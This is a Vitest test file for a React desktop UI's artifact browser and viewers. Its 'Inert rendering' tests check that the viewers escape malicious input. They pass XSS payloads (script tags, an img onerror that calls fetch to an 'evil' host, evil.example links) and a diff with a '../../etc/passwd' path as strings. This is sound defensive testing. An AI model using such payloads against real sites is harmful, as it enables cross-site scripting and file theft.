// @vitest-environment jsdom

import { Code, ConnectError } from "@connectrpc/connect";
import { cleanup, render, screen, waitFor } from "@testing-library/react";
import userEvent from "@testing-library/user-event";
import type { WorkOSClients } from "@workos/agent-sdk";
import { AgentTaskState, type AgentEvent, type Artifact, type Project } from "@workos/protocol";
import { afterEach, describe, expect, it, vi } from "vitest";
import { ArtifactCenter } from "./ArtifactCenter.js";
import { Desktop } from "./Desktop.js";
import { ArtifactViewer, DiffView, MarkdownView } from "@workos/artifact-viewer";

// React 19 act() requires this flag in jsdom to flush deferred promise updates.
(globalThis as { IS_REACT_ACT_ENVIRONMENT?: boolean }).IS_REACT_ACT_ENVIRONMENT = true;

afterEach(() => {
  cleanup();
  window.sessionStorage.clear();
});

const MARKDOWN_BYTES = new TextEncoder().encode(
  "# Fake Harness Review Document\n\nSynthetic body.",
);

function reviewArtifact(id: string): Artifact {
  return {
    $typeName: "workos.artifact.v1.Artifact",
    id,
    projectId: "project-1",
    type: "document.markdown.v1",
    title: "Fake Harness Review Document",
    mediaType: "text/markdown; charset=utf-8",
    contentRef: "",
    digest: `sha256:${"a".repeat(64)}`,
    totalSizeBytes: BigInt(MARKDOWN_BYTES.length),
    fileCount: 1,
    sourceTaskId: "task-1",
  };
}

function diffArtifact(id: string): Artifact {
  return {
    ...reviewArtifact(id),
    type: "code.unified-diff.v1",
    mediaType: "text/x-diff; charset=utf-8",
    title: "Fake Harness Proposed Patch",
  };
}

function artifactCreatedEvent(taskId: string, artifactId: string): AgentEvent {
  return {
    $typeName: "workos.agent.v1.AgentEvent",
    id: "event-2",
    taskId,
    sequence: 2n,
    event: {
      case: "artifactCreated",
      value: {
        $typeName: "workos.agent.v1.ArtifactCreated",
        artifactId,
        artifactType: "document.markdown.v1",
      },
    },
  };
}

function markdownContent(): {
  content: { case: "markdown"; value: { mediaType: string; content: Uint8Array } };
} {
  return {
    content: {
      case: "markdown",
      value: { mediaType: "text/markdown; charset=utf-8", content: MARKDOWN_BYTES },
    },
  };
}

function project(id: string, name: string, revision: bigint): Project {
  return {
    $typeName: "workos.project.v1.Project",
    id,
    ownerUserId: "local-user",
    name,
    icon: "◈",
    workspaceRefs: [],
    harnessBinding: undefined,
    installedAppIds: [],
    defaultAgentRole: "general",
    knowledgeCollectionId: "",
    revision,
    createdAt: undefined,
    updatedAt: undefined,
    archivedAt: undefined,
  } as unknown as Project;
}

function clientFixture(overrides: {
  listArtifacts?: ReturnType<typeof vi.fn>;
  getReviewArtifact?: ReturnType<typeof vi.fn>;
}): WorkOSClients {
  return {
    projects: {
      listProjects: vi.fn(() =>
        Promise.resolve({ projects: [project("project-1", "Project One", 1n)], page: undefined }),
      ),
      getProject: vi.fn(),
      createProject: vi.fn(),
    },
    projectHarnessBindings: { setProjectHarnessBinding: vi.fn() },
    harnessCatalog: { getHarnessCatalog: vi.fn(() => Promise.reject(new ConnectError("none"))) },
    agentTasks: { submitTask: vi.fn(), watchTaskEvents: vi.fn(), getTask: vi.fn() },
    appRegistry: {
      listApps: vi.fn(() => Promise.resolve({ apps: [], page: { nextPageToken: "" } })),
      getApp: vi.fn(() => Promise.resolve({ app: undefined })),
    },
    appInstallations: {
      listInstalledApps: vi.fn(() =>
        Promise.resolve({ installations: [], page: { nextPageToken: "" } }),
      ),
      installApp: vi.fn(),
      uninstallApp: vi.fn(),
      setAppGrants: vi.fn(),
    },
    artifacts: {
      createArtifact: vi.fn(),
      getArtifact: vi.fn(),
      listArtifacts: overrides.listArtifacts ?? vi.fn(),
      getReviewArtifact: overrides.getReviewArtifact ?? vi.fn(),
    },
    surfaces: { createSurface: vi.fn(), closeSurface: vi.fn() },
  } as unknown as WorkOSClients;
}

describe("Artifact Center", () => {
  it("lists the project's review artifacts and opens the authoritative viewer", async () => {
    const getReviewArtifact = vi.fn(() =>
      Promise.resolve({ artifact: reviewArtifact("artifact-1"), content: markdownContent() }),
    );
    render(
      <Desktop
        workosClients={clientFixture({
          listArtifacts: vi.fn(() =>
            Promise.resolve({
              artifacts: [reviewArtifact("artifact-1"), diffArtifact("artifact-2")],
              page: { nextPageToken: "" },
            }),
          ),
          getReviewArtifact,
        })}
      />,
    );

    await userEvent.click(await screen.findByRole("button", { name: "Open Artifact Center" }));
    const rows = await screen.findAllByTestId("artifact-row");
    expect(rows).toHaveLength(2);

    const firstRow = rows[0];
    if (!firstRow) throw new Error("expected at least one artifact row");
    await userEvent.click(firstRow);
    await waitFor(() => {
      expect(getReviewArtifact).toHaveBeenCalledWith({ artifactId: "artifact-1" });
    });
    // Clicking the same artifact again focuses the same window instead of
    // duplicating windows.
    await userEvent.click(firstRow);
    expect(await screen.findAllByText("Artifact Review")).toHaveLength(1);
    expect(
      await screen.findByRole("heading", { level: 1, name: "Fake Harness Review Document" }),
    ).toBeTruthy();
  });

  it("shows loading, unavailable, and retry states without leaking server detail", async () => {
    render(
      <Desktop
        workosClients={clientFixture({
          listArtifacts: vi.fn(() => Promise.reject(new ConnectError("boom", Code.Unavailable))),
        })}
      />,
    );
    await userEvent.click(await screen.findByRole("button", { name: "Open Artifact Center" }));
    expect(await screen.findByText("Artifact store is temporarily unavailable.")).toBeTruthy();
    await userEvent.click(screen.getByRole("button", { name: "Retry" }));
    expect(screen.getByText("Artifact store is temporarily unavailable.")).toBeTruthy();
  });

  it("isolates a late list response from a project switch", async () => {
    const lateForProjectA = vi
      .fn()
      .mockReturnValueOnce(
        new Promise((resolve) => {
          // Resolves only after project B's immediate answer below.
          setTimeout(() => {
            resolve({
              artifacts: [
                {
                  $typeName: "workos.artifact.v1.Artifact",
                  id: "artifact-a",
                  projectId: "project-a",
                  type: "document.markdown.v1",
                  title: "Project A stale document",
                  mediaType: "text/markdown; charset=utf-8",
                  contentRef: "",
                  digest: `sha256:${"a".repeat(64)}`,
                  totalSizeBytes: 1n,
                  fileCount: 1,
                  sourceTaskId: "task-a",
                },
              ],
              page: { nextPageToken: "" },
            });
          }, 30);
        }),
      )
      .mockReturnValueOnce(Promise.resolve({ artifacts: [], page: { nextPageToken: "" } }));
    const { rerender } = render(
      <ArtifactCenter
        key="project-a"
        projectId="project-a"
        workosClients={clientFixture({ listArtifacts: lateForProjectA })}
        onOpenArtifact={() => {}}
      />,
    );
    // Switching projects remounts the center with a new key; the in-flight
    // project-A fetch must never paint into project B's window.
    rerender(
      <ArtifactCenter
        key="project-b"
        projectId="project-b"
        workosClients={clientFixture({
          listArtifacts: vi.fn(() =>
            Promise.resolve({ artifacts: [], page: { nextPageToken: "" } }),
          ),
        })}
        onOpenArtifact={() => {}}
      />,
    );
    await waitFor(() => {
      expect(screen.getByText(/No review artifacts yet/)).toBeTruthy();
    });
    expect(screen.queryByText("Project A stale document")).toBeNull();
  });
});

describe("Timeline artifact events", () => {
  it("opens a review window from a Core-minted artifact event", async () => {
    const submitted = {
      $typeName: "workos.agent.v1.AgentTask",
      id: "task-1",
      ownerUserId: "local-user",
      state: AgentTaskState.RUNNING,
      providerId: "fake",
      harnessInstanceId: "",
      runId: "",
      lastEventSequence: 2n,
    };
    const started: AgentEvent = {
      $typeName: "workos.agent.v1.AgentEvent",
      id: "event-1",
      taskId: "task-1",
      sequence: 1n,
      event: {
        case: "runStarted",
        value: { $typeName: "workos.agent.v1.RunStarted", runId: "run-1", providerId: "fake" },
      },
    };
    async function* stream() {
      await Promise.resolve();
      yield { event: started };
      yield { event: artifactCreatedEvent("task-1", "artifact-1") };
    }
    const getReviewArtifact = vi.fn(() =>
      Promise.resolve({ artifact: reviewArtifact("artifact-1"), content: markdownContent() }),
    );
    const workosClients = clientFixture({ getReviewArtifact });
    workosClients.agentTasks = {
      submitTask: vi.fn(() => Promise.resolve({ task: submitted })),
      watchTaskEvents: vi.fn(() => stream()),
      getTask: vi.fn(),
    } as never;
    render(<Desktop workosClients={workosClients} />);

    const goal = await screen.findByRole("textbox", { name: "Agent goal" });
    await userEvent.type(goal, "produce a document");
    await userEvent.click(screen.getByRole("button", { name: "Run task" }));

    const open = await screen.findByRole("button", { name: /Artifact · document.markdown.v1/ });
    await userEvent.click(open);
    await waitFor(() => {
      expect(getReviewArtifact).toHaveBeenCalledWith({ artifactId: "artifact-1" });
    });
    expect(
      await screen.findByRole("heading", { level: 1, name: "Fake Harness Review Document" }),
    ).toBeTruthy();
  });

  it("shows the fixed unavailable verdict for a missing artifact reference", async () => {
    const getReviewArtifact = vi.fn(() =>
      Promise.reject(new ConnectError("missing", Code.NotFound)),
    );
    render(<Desktop workosClients={clientFixture({ getReviewArtifact })} />);
    // Open the viewer directly through the center path is unavailable; use
    // the timeline by simulating a completed task stream instead. The center
    // route needs a list; use getReviewArtifact failure through a listed row.
    renderArtifactViewerForProbe(getReviewArtifact);
    await screen.findByText("Artifact unavailable.");
    expect(getReviewArtifact).toHaveBeenCalled();
  });
});

// renderArtifactViewerForProbe mounts the viewer window body exactly like the
// Desktop window branch does, for verdict-focused tests.
import { Fragment } from "react";
import { ArtifactViewerWindow } from "./ArtifactViewerWindow.js";
function renderArtifactViewerForProbe(getReviewArtifact: ReturnType<typeof vi.fn>) {
  render(
    <Fragment>
      <ArtifactViewerWindow
        artifactId="artifact-missing"
        workosClients={clientFixture({ getReviewArtifact })}
      />
    </Fragment>,
  );
}

describe("Inert rendering", () => {
  it("renders malicious markdown as plain escaped text", () => {
    render(
      <MarkdownView
        text={
          '<script>window.__pwned = true;</script>\n\n<img src=x onerror="fetch(\'https://evil\')">\n\n[click](https://evil.example)\n\n![x](https://evil.example/x.png)\n\n<script src="https://evil"></script>'
        }
      />,
    );
    expect(document.querySelector("script")).toBeNull();
    expect(document.querySelector("img")).toBeNull();
    expect(document.querySelector("a")).toBeNull();
    expect(document.querySelector("iframe")).toBeNull();
    const view = document.querySelector(".markdown-view") as HTMLElement;
    expect(view.textContent).toContain("<script>");
    expect(view.textContent).toContain("[click](https://evil.example)");
  });

  it("supports the allowed markdown constructs only", () => {
    render(
      <MarkdownView
        text={
          "# Title\n\n## Section\n\nBody with **bold**, *em*, and `code`.\n\n- one\n- two\n\n> quoted\n\n```text\nfenced\n```\n"
        }
      />,
    );
    expect(screen.getByRole("heading", { level: 1, name: "Title" })).toBeTruthy();
    expect(screen.getByRole("heading", { level: 2, name: "Section" })).toBeTruthy();
    expect(screen.getByText("fenced")).toBeTruthy();
    expect(document.querySelectorAll("li")).toHaveLength(2);
    expect(document.querySelectorAll("blockquote")).toHaveLength(1);
    expect(document.querySelector("strong")?.textContent).toBe("bold");
    expect(document.querySelectorAll("code").length).toBeGreaterThanOrEqual(2);
  });

  it("renders diff paths and content as inert text", () => {
    const malicious = [
      "diff --git a/../../etc/passwd b/<script>alert(1)</script>",
      "--- a/../../etc/passwd",
      "+++ b/<script>alert(1)</script>",
      "@@ -1,2 +1,3 @@",
      "-const secret = readHostFile();",
      '+const safe = "workos";',
      "\\ No newline at end of file",
    ].join("\n");
    render(<DiffView text={malicious} />);
    expect(document.querySelector("script")).toBeNull();
    const view = document.querySelector(".diff-view") as HTMLElement;
    expect(view.textContent).toContain("../../etc/passwd");
    expect(view.textContent).toContain("<script>alert(1)</script>");
    expect(view.querySelectorAll(".diff-addition")).toHaveLength(1);
    expect(view.querySelectorAll(".diff-deletion")).toHaveLength(1);
    expect(view.querySelectorAll(".diff-hunk-header")).toHaveLength(1);
    expect(view.querySelectorAll(".diff-file-header")).toHaveLength(3);
  });

  it("renders a stored artifact through the typed viewer verdicts", () => {
    const { rerender } = render(
      <ArtifactViewer artifact={undefined} content={undefined} loading={true} />,
    );
    expect(screen.getByText("Loading artifact…")).toBeTruthy();
    rerender(
      <ArtifactViewer
        artifact={undefined}
        content={undefined}
        loading={false}
        error="unavailable"
      />,
    );
    expect(screen.getByText("Artifact unavailable.")).toBeTruthy();
    rerender(
      <ArtifactViewer
        artifact={reviewArtifact("artifact-1")}
        content={MARKDOWN_BYTES}
        loading={false}
      />,
    );
    expect(screen.getByRole("heading", { name: "Fake Harness Review Document" })).toBeTruthy();
  });
});
